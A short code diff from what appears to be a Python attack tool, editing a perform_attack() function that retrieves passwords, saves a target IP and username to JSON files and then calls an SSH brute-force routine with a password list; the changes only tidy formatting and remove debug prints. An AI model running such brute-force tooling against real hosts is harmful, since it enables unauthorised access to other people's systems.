@@ -13,7 +13,7 @@ def perform_attack():
     findmy_password.finder()
     print("password retrieval complete.\n")
     print("proceeding with SSH brute-force attack...\n")
-    print()
+    
     print("initializing attack...")
     
     # file directory
@@ -46,20 +46,18 @@ def perform_attack():
     
     # updating file
     with open(targetIP, "w") as ipAddress_key:
-        json.dump(target_ip, ipAddress_key, indent=4)
+        json.dump(target_ip, ipAddress_key)
     
     # updating file
     with open(targetUser, "w") as username_key:
-        json.dump(target_user, username_key, indent=4)
+        json.dump(target_user, username_key)
         
     # file directory
     base_dir = os.path.dirname(__file__)  # directory of app/__init__.py
     password_File = os.path.join(base_dir, 'passwords.txt')
     
     TARGETIP = str(target_ip[verify_ip]).strip()
-    print(TARGETIP)
     TARGETUSER = str(target_user[verify_user]).strip()
-    print(TARGETUSER)
     password_document = password_File
     
     ssh_script.ssh_brute_force(TARGETIP, TARGETUSER, password_document)
